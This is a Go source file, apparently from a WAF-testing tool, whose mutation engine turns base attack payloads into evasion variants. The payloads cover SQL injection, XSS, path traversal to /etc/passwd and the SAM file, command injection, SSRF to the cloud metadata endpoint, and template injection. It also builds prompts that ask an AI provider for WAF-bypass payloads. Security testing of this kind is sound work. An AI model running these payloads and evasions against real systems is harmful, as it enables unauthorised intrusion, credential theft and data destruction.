// Package ai provides AI-assisted security testing capabilities
package ai

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/internal/hexutil"
)

// Provider represents an AI provider
type Provider string

const (
	ProviderOpenAI    Provider = "openai"
	ProviderAnthropic Provider = "anthropic"
	ProviderLocal     Provider = "local"
	ProviderOllama    Provider = "ollama"
)

// PayloadType represents a category of attack payloads
type PayloadType string

const (
	PayloadSQLi   PayloadType = "sqli"
	PayloadXSS    PayloadType = "xss"
	PayloadLFI    PayloadType = "lfi"
	PayloadRCE    PayloadType = "rce"
	PayloadSSRF   PayloadType = "ssrf"
	PayloadXXE    PayloadType = "xxe"
	PayloadSSTI   PayloadType = "ssti"
	PayloadNoSQLi PayloadType = "nosqli"
	PayloadLDAPi  PayloadType = "ldapi"
	PayloadBypass PayloadType = "waf-bypass"
)

// PayloadRequest represents a request for AI-generated payloads
type PayloadRequest struct {
	Type         PayloadType         `json:"type"`
	TargetWAF    string              `json:"target_waf,omitempty"`   // cloudflare, modsecurity, aws-waf
	Context      string              `json:"context,omitempty"`      // URL parameter, header, body
	Encoding     []string            `json:"encoding,omitempty"`     // base64, url, unicode, double-url
	EvasionLevel int                 `json:"evasion_level"`          // 1-5, higher = more obfuscation
	Count        int                 `json:"count"`                  // Number of payloads to generate
	BasePayload  string              `json:"base_payload,omitempty"` // Seed payload to mutate
	Constraints  *PayloadConstraints `json:"constraints,omitempty"`
	Custom       map[string]string   `json:"custom,omitempty"` // Custom parameters
}

// PayloadConstraints defines limits on generated payloads
type PayloadConstraints struct {
	MaxLength      int      `json:"max_length,omitempty"`
	AllowedChars   string   `json:"allowed_chars,omitempty"`
	ForbiddenChars string   `json:"forbidden_chars,omitempty"`
	MustContain    []string `json:"must_contain,omitempty"`
	MustNotContain []string `json:"must_not_contain,omitempty"`
}

// GeneratedPayload represents an AI-generated attack payload
type GeneratedPayload struct {
	Payload       string            `json:"payload"`
	Type          PayloadType       `json:"type"`
	Encoding      string            `json:"encoding,omitempty"`
	EvasionLevel  int               `json:"evasion_level"`
	Description   string            `json:"description,omitempty"`
	Confidence    float64           `json:"confidence"` // 0.0-1.0
	Tags          []string          `json:"tags,omitempty"`
	Mutations     []string          `json:"mutations,omitempty"`      // Applied mutations
	ParentPayload string            `json:"parent_payload,omitempty"` // Source if mutated
	Metadata      map[string]string `json:"metadata,omitempty"`
}

// Client interfaces with AI providers
type Client interface {
	// Provider returns the provider name
	Provider() Provider

	// GeneratePayloads generates attack payloads
	GeneratePayloads(ctx context.Context, req *PayloadRequest) ([]*GeneratedPayload, error)

	// MutatePayload creates variations of an existing payload
	MutatePayload(ctx context.Context, payload string, payloadType PayloadType, count int) ([]*GeneratedPayload, error)

	// AnalyzeWAFResponse analyzes a WAF response to suggest bypass payloads
	AnalyzeWAFResponse(ctx context.Context, response string, originalPayload string) (*WAFAnalysis, error)

	// Validate checks if credentials are valid
	Validate(ctx context.Context) error
}

// WAFAnalysis represents AI analysis of a WAF response
type WAFAnalysis struct {
	WAFDetected       bool              `json:"waf_detected"`
	WAFName           string            `json:"waf_name,omitempty"`
	BlockReason       string            `json:"block_reason,omitempty"`
	BypassSuggestions []string          `json:"bypass_suggestions,omitempty"`
	EvasionTechniques []string          `json:"evasion_techniques,omitempty"`
	Confidence        float64           `json:"confidence"`
	Metadata          map[string]string `json:"metadata,omitempty"`
}

// Generator manages AI payload generation
type Generator struct {
	clients   map[Provider]Client
	mu        sync.RWMutex
	cache     *PayloadCache
	rateLimit *RateLimiter
}

// NewGenerator creates a new AI payload generator
func NewGenerator() *Generator {
	return &Generator{
		clients:   make(map[Provider]Client),
		cache:     NewPayloadCache(1000, 1*time.Hour),
		rateLimit: NewRateLimiter(10, time.Minute), // 10 requests per minute
	}
}

// RegisterClient registers an AI provider client
func (g *Generator) RegisterClient(client Client) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.clients[client.Provider()] = client
}

// GetClient returns a registered client
func (g *Generator) GetClient(provider Provider) (Client, bool) {
	g.mu.RLock()
	defer g.mu.RUnlock()
	client, ok := g.clients[provider]
	return client, ok
}

// Generate generates payloads using the specified provider
func (g *Generator) Generate(ctx context.Context, provider Provider, req *PayloadRequest) ([]*GeneratedPayload, error) {
	client, ok := g.GetClient(provider)
	if !ok {
		return nil, fmt.Errorf("provider not registered: %s", provider)
	}

	// Check rate limit
	if !g.rateLimit.Allow() {
		return nil, fmt.Errorf("rate limit exceeded")
	}

	// Check cache
	cacheKey := g.cacheKey(req)
	if cached, ok := g.cache.Get(cacheKey); ok {
		return cached, nil
	}

	payloads, err := client.GeneratePayloads(ctx, req)
	if err != nil {
		return nil, err
	}

	// Cache results
	g.cache.Set(cacheKey, payloads)

	return payloads, nil
}

func (g *Generator) cacheKey(req *PayloadRequest) string {
	data, _ := json.Marshal(req)
	return string(data)
}

// OpenAIClient implements Client for OpenAI
type OpenAIClient struct {
	APIKey     string
	Model      string
	BaseURL    string
	httpClient *http.Client
}

// NewOpenAIClient creates a new OpenAI client
func NewOpenAIClient(apiKey, model string) *OpenAIClient {
	if model == "" {
		model = "gpt-4"
	}
	return &OpenAIClient{
		APIKey:  apiKey,
		Model:   model,
		BaseURL: "https://api.openai.com/v1",
		httpClient: &http.Client{
			Timeout: 60 * time.Second,
		},
	}
}

func (c *OpenAIClient) Provider() Provider {
	return ProviderOpenAI
}

func (c *OpenAIClient) Validate(ctx context.Context) error {
	if c.APIKey == "" {
		return fmt.Errorf("missing OpenAI API key")
	}
	return nil
}

func (c *OpenAIClient) GeneratePayloads(ctx context.Context, req *PayloadRequest) ([]*GeneratedPayload, error) {
	// Build prompt for future API integration
	_ = c.buildPayloadPrompt(req)

	// In real implementation, would call OpenAI API
	// For now, use built-in mutation engine
	return c.generateWithMutations(req), nil
}

func (c *OpenAIClient) buildPayloadPrompt(req *PayloadRequest) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Generate %d %s attack payloads", req.Count, req.Type))

	if req.TargetWAF != "" {
		sb.WriteString(fmt.Sprintf(" designed to bypass %s WAF", req.TargetWAF))
	}
	if req.EvasionLevel > 0 {
		sb.WriteString(fmt.Sprintf(" with evasion level %d/5", req.EvasionLevel))
	}
	if len(req.Encoding) > 0 {
		sb.WriteString(fmt.Sprintf(" using encodings: %s", strings.Join(req.Encoding, ", ")))
	}

	return sb.String()
}

func (c *OpenAIClient) generateWithMutations(req *PayloadRequest) []*GeneratedPayload {
	// Use built-in mutation engine for local generation
	engine := NewMutationEngine()

	basePayloads := engine.GetBasePayloads(req.Type)
	var results []*GeneratedPayload

	for _, base := range basePayloads {
		if len(results) >= req.Count {
			break
		}

		mutated := engine.Mutate(base, req.Type, req.EvasionLevel, req.Encoding)
		for _, m := range mutated {
			if len(results) >= req.Count {
				break
			}
			results = append(results, &GeneratedPayload{
				Payload:       m,
				Type:          req.Type,
				EvasionLevel:  req.EvasionLevel,
				Confidence:    0.8,
				ParentPayload: base,
			})
		}
	}

	return results
}

func (c *OpenAIClient) MutatePayload(ctx context.Context, payload string, payloadType PayloadType, count int) ([]*GeneratedPayload, error) {
	engine := NewMutationEngine()
	mutated := engine.Mutate(payload, payloadType, 3, nil)

	var results []*GeneratedPayload
	for i, m := range mutated {
		if i >= count {
			break
		}
		results = append(results, &GeneratedPayload{
			Payload:       m,
			Type:          payloadType,
			ParentPayload: payload,
			Confidence:    0.7,
		})
	}

	return results, nil
}

func (c *OpenAIClient) AnalyzeWAFResponse(ctx context.Context, response string, originalPayload string) (*WAFAnalysis, error) {
	analysis := &WAFAnalysis{
		Confidence: 0.5,
	}

	// Simple heuristic WAF detection
	responseLower := strings.ToLower(response)

	wafSignatures := map[string]string{
		"cloudflare":  "cloudflare",
		"modsecurity": "modsecurity",
		"aws waf":     "aws-waf",
		"akamai":      "akamai",
		"imperva":     "imperva",
		"f5":          "f5",
		"fortinet":    "fortinet",
	}

	for name, signature := range wafSignatures {
		if strings.Contains(responseLower, signature) {
			analysis.WAFDetected = true
			analysis.WAFName = name
			analysis.Confidence = 0.9
			break
		}
	}

	// Detect block patterns
	blockPatterns := []string{"blocked", "forbidden", "access denied", "security violation", "attack detected"}
	for _, pattern := range blockPatterns {
		if strings.Contains(responseLower, pattern) {
			analysis.WAFDetected = true
			analysis.BlockReason = pattern
			break
		}
	}

	// Suggest bypass techniques
	if analysis.WAFDetected {
		analysis.BypassSuggestions = []string{
			"Try URL encoding",
			"Try double URL encoding",
			"Try Unicode normalization",
			"Try case variation",
			"Try comment insertion",
			"Try null byte injection",
		}
		analysis.EvasionTechniques = []string{
			"encoding",
			"case-switching",
			"comment-insertion",
			"whitespace-manipulation",
		}
	}

	return analysis, nil
}

// AnthropicClient implements Client for Anthropic Claude
type AnthropicClient struct {
	APIKey     string
	Model      string
	httpClient *http.Client
}

// NewAnthropicClient creates a new Anthropic client
func NewAnthropicClient(apiKey, model string) *AnthropicClient {
	if model == "" {
		model = "claude-3-opus-20240229"
	}
	return &AnthropicClient{
		APIKey: apiKey,
		Model:  model,
		httpClient: &http.Client{
			Timeout: 60 * time.Second,
		},
	}
}

func (c *AnthropicClient) Provider() Provider {
	return ProviderAnthropic
}

func (c *AnthropicClient) Validate(ctx context.Context) error {
	if c.APIKey == "" {
		return fmt.Errorf("missing Anthropic API key")
	}
	return nil
}

func (c *AnthropicClient) GeneratePayloads(ctx context.Context, req *PayloadRequest) ([]*GeneratedPayload, error) {
	// Use mutation engine for local generation
	engine := NewMutationEngine()
	basePayloads := engine.GetBasePayloads(req.Type)
	var results []*GeneratedPayload

	for _, base := range basePayloads {
		if len(results) >= req.Count {
			break
		}
		mutated := engine.Mutate(base, req.Type, req.EvasionLevel, req.Encoding)
		for _, m := range mutated {
			if len(results) >= req.Count {
				break
			}
			results = append(results, &GeneratedPayload{
				Payload:       m,
				Type:          req.Type,
				EvasionLevel:  req.EvasionLevel,
				Confidence:    0.8,
				ParentPayload: base,
			})
		}
	}

	return results, nil
}

func (c *AnthropicClient) MutatePayload(ctx context.Context, payload string, payloadType PayloadType, count int) ([]*GeneratedPayload, error) {
	engine := NewMutationEngine()
	mutated := engine.Mutate(payload, payloadType, 3, nil)

	var results []*GeneratedPayload
	for i, m := range mutated {
		if i >= count {
			break
		}
		results = append(results, &GeneratedPayload{
			Payload:       m,
			Type:          payloadType,
			ParentPayload: payload,
			Confidence:    0.7,
		})
	}

	return results, nil
}

func (c *AnthropicClient) AnalyzeWAFResponse(ctx context.Context, response string, originalPayload string) (*WAFAnalysis, error) {
	return &WAFAnalysis{
		WAFDetected: strings.Contains(strings.ToLower(response), "blocked") ||
			strings.Contains(strings.ToLower(response), "forbidden"),
		Confidence: 0.6,
	}, nil
}

// LocalClient uses local mutation engine (no API calls)
type LocalClient struct{}

// NewLocalClient creates a new local client
func NewLocalClient() *LocalClient {
	return &LocalClient{}
}

func (c *LocalClient) Provider() Provider {
	return ProviderLocal
}

func (c *LocalClient) Validate(ctx context.Context) error {
	return nil
}

func (c *LocalClient) GeneratePayloads(ctx context.Context, req *PayloadRequest) ([]*GeneratedPayload, error) {
	engine := NewMutationEngine()
	basePayloads := engine.GetBasePayloads(req.Type)
	var results []*GeneratedPayload

	for _, base := range basePayloads {
		if len(results) >= req.Count {
			break
		}
		mutated := engine.Mutate(base, req.Type, req.EvasionLevel, req.Encoding)
		for _, m := range mutated {
			if len(results) >= req.Count {
				break
			}
			results = append(results, &GeneratedPayload{
				Payload:       m,
				Type:          req.Type,
				EvasionLevel:  req.EvasionLevel,
				Confidence:    0.9,
				ParentPayload: base,
			})
		}
	}

	return results, nil
}

func (c *LocalClient) MutatePayload(ctx context.Context, payload string, payloadType PayloadType, count int) ([]*GeneratedPayload, error) {
	engine := NewMutationEngine()
	mutated := engine.Mutate(payload, payloadType, 3, nil)

	var results []*GeneratedPayload
	for i, m := range mutated {
		if i >= count {
			break
		}
		results = append(results, &GeneratedPayload{
			Payload:       m,
			Type:          payloadType,
			ParentPayload: payload,
			Confidence:    0.9,
		})
	}

	return results, nil
}

func (c *LocalClient) AnalyzeWAFResponse(ctx context.Context, response string, originalPayload string) (*WAFAnalysis, error) {
	return &WAFAnalysis{
		WAFDetected: strings.Contains(strings.ToLower(response), "blocked"),
		Confidence:  0.5,
	}, nil
}

// MutationEngine provides payload mutation capabilities
type MutationEngine struct {
	basePayloads map[PayloadType][]string
	mutators     []Mutator
}

// Mutator transforms a payload
type Mutator interface {
	Name() string
	Mutate(payload string) []string
}

// NewMutationEngine creates a new mutation engine
func NewMutationEngine() *MutationEngine {
	engine := &MutationEngine{
		basePayloads: make(map[PayloadType][]string),
	}
	engine.loadBasePayloads()
	engine.registerMutators()
	return engine
}

func (e *MutationEngine) loadBasePayloads() {
	e.basePayloads[PayloadSQLi] = []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"'; DROP TABLE users;--",
		"' UNION SELECT NULL,NULL,NULL--",
		"1' AND '1'='1",
		"admin'--",
	}

	e.basePayloads[PayloadXSS] = []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"<body onload=alert(1)>",
		"<iframe src='javascript:alert(1)'>",
	}

	e.basePayloads[PayloadLFI] = []string{
		"../../../etc/passwd",
		"....//....//....//etc/passwd",
		"/etc/passwd%00",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"php://filter/convert.base64-encode/resource=index.php",
	}

	e.basePayloads[PayloadRCE] = []string{
		"; ls -la",
		"| cat /etc/passwd",
		"`id`",
		"$(whoami)",
		"; ping -c 3 127.0.0.1",
	}

	e.basePayloads[PayloadSSRF] = []string{
		"http://localhost",
		"http://127.0.0.1",
		"http://169.254.169.254/latest/meta-data/",
		"http://[::1]",
		"http://2130706433", // 127.0.0.1 as decimal
	}

	e.basePayloads[PayloadSSTI] = []string{
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"{{constructor.constructor('return this')()}}",
		"#{7*7}",
	}

	e.basePayloads[PayloadBypass] = []string{
		// These are specifically for WAF bypass testing
		"sel%65ct", // URL encoded 'e'
		"sel/**/ect",
		"SeLeCt",
		"s%00elect",
	}
}

func (e *MutationEngine) registerMutators() {
	e.mutators = []Mutator{
		&CaseMutator{},
		&URLEncodeMutator{},
		&DoubleURLEncodeMutator{},
		&UnicodeMutator{},
		&CommentMutator{},
		&WhitespaceMutator{},
		&NullByteMutator{},
	}
}

// GetBasePayloads returns base payloads for a type
func (e *MutationEngine) GetBasePayloads(payloadType PayloadType) []string {
	if payloads, ok := e.basePayloads[payloadType]; ok {
		return payloads
	}
	return []string{}
}

// Mutate applies mutations to a payload
func (e *MutationEngine) Mutate(payload string, payloadType PayloadType, level int, encodings []string) []string {
	results := []string{payload}

	// Apply mutations based on level
	for i := 0; i < level && i < len(e.mutators); i++ {
		var newResults []string
		for _, p := range results {
			mutated := e.mutators[i].Mutate(p)
			newResults = append(newResults, mutated...)
		}
		results = append(results, newResults...)
	}

	// Remove duplicates
	seen := make(map[string]bool)
	unique := []string{}
	for _, r := range results {
		if !seen[r] {
			seen[r] = true
			unique = append(unique, r)
		}
	}

	return unique
}

// CaseMutator changes case
type CaseMutator struct{}

func (m *CaseMutator) Name() string { return "case" }

func (m *CaseMutator) Mutate(payload string) []string {
	return []string{
		strings.ToUpper(payload),
		strings.ToLower(payload),
		toggleCase(payload),
	}
}

func toggleCase(s string) string {
	var result []byte
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'a' && c <= 'z' {
			result = append(result, c-32)
		} else if c >= 'A' && c <= 'Z' {
			result = append(result, c+32)
		} else {
			result = append(result, c)
		}
	}
	return string(result)
}

// URLEncodeMutator URL encodes characters
type URLEncodeMutator struct{}

func (m *URLEncodeMutator) Name() string { return "url-encode" }

func (m *URLEncodeMutator) Mutate(payload string) []string {
	var result strings.Builder
	result.Grow(len(payload) * 3)
	for i := 0; i < len(payload); i++ {
		c := payload[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			result.WriteByte(c)
		} else {
			result.WriteString(hexutil.URLEncoded[c])
		}
	}
	return []string{result.String()}
}

// DoubleURLEncodeMutator double URL encodes
type DoubleURLEncodeMutator struct{}

func (m *DoubleURLEncodeMutator) Name() string { return "double-url-encode" }

func (m *DoubleURLEncodeMutator) Mutate(payload string) []string {
	// First encode
	first := (&URLEncodeMutator{}).Mutate(payload)[0]
	// Encode the % signs
	result := strings.ReplaceAll(first, "%", "%25")
	return []string{result}
}

// UnicodeMutator uses Unicode alternatives
type UnicodeMutator struct{}

func (m *UnicodeMutator) Name() string { return "unicode" }

func (m *UnicodeMutator) Mutate(payload string) []string {
	// Replace with Unicode fullwidth equivalents
	replacements := map[rune]string{
		'<':  "\uff1c", // Fullwidth less-than
		'>':  "\uff1e", // Fullwidth greater-than
		'/':  "\uff0f", // Fullwidth solidus
		'\'': "\uff07", // Fullwidth apostrophe
	}

	result := payload
	for old, new := range replacements {
		result = strings.ReplaceAll(result, string(old), new)
	}

	return []string{result}
}

// CommentMutator inserts SQL/code comments
type CommentMutator struct{}

func (m *CommentMutator) Name() string { return "comment" }

func (m *CommentMutator) Mutate(payload string) []string {
	// Insert SQL comments between keywords
	sqlKeywords := regexp.MustCompile(`(?i)(select|union|from|where|and|or)`)
	commented := sqlKeywords.ReplaceAllString(payload, "/**/$1/**/")
	return []string{commented}
}

// WhitespaceMutator uses alternative whitespace
type WhitespaceMutator struct{}

func (m *WhitespaceMutator) Name() string { return "whitespace" }

func (m *WhitespaceMutator) Mutate(payload string) []string {
	alternatives := []string{
		strings.ReplaceAll(payload, " ", "\t"),
		strings.ReplaceAll(payload, " ", "\n"),
		strings.ReplaceAll(payload, " ", "%09"),
		strings.ReplaceAll(payload, " ", "%0a"),
	}
	return alternatives
}

// NullByteMutator inserts null bytes
type NullByteMutator struct{}

func (m *NullByteMutator) Name() string { return "null-byte" }

func (m *NullByteMutator) Mutate(payload string) []string {
	return []string{
		payload + "%00",
		payload + "\x00",
		strings.ReplaceAll(payload, " ", "%00"),
	}
}

// PayloadCache caches generated payloads
type PayloadCache struct {
	cache   map[string]*cacheEntry
	mu      sync.RWMutex
	maxSize int
	ttl     time.Duration
}

type cacheEntry struct {
	payloads []*GeneratedPayload
	expires  time.Time
}

// NewPayloadCache creates a new cache
func NewPayloadCache(maxSize int, ttl time.Duration) *PayloadCache {
	return &PayloadCache{
		cache:   make(map[string]*cacheEntry),
		maxSize: maxSize,
		ttl:     ttl,
	}
}

// Get retrieves cached payloads
func (c *PayloadCache) Get(key string) ([]*GeneratedPayload, bool) {
	c.mu.RLock()
	defer c.mu.RUnlock()

	entry, ok := c.cache[key]
	if !ok {
		return nil, false
	}

	if time.Now().After(entry.expires) {
		return nil, false
	}

	return entry.payloads, true
}

// Set stores payloads in cache
func (c *PayloadCache) Set(key string, payloads []*GeneratedPayload) {
	c.mu.Lock()
	defer c.mu.Unlock()

	if len(c.cache) >= c.maxSize {
		// Simple eviction: remove oldest
		for k := range c.cache {
			delete(c.cache, k)
			break
		}
	}

	c.cache[key] = &cacheEntry{
		payloads: payloads,
		expires:  time.Now().Add(c.ttl),
	}
}

// RateLimiter limits API requests
type RateLimiter struct {
	requests int
	window   time.Duration
	mu       sync.Mutex
	count    int
	resetAt  time.Time
}

// NewRateLimiter creates a new rate limiter
func NewRateLimiter(requests int, window time.Duration) *RateLimiter {
	return &RateLimiter{
		requests: requests,
		window:   window,
		resetAt:  time.Now().Add(window),
	}
}

// Allow checks if a request is allowed
func (r *RateLimiter) Allow() bool {
	r.mu.Lock()
	defer r.mu.Unlock()

	now := time.Now()
	if now.After(r.resetAt) {
		r.count = 0
		r.resetAt = now.Add(r.window)
	}

	if r.count >= r.requests {
		return false
	}

	r.count++
	return true
}
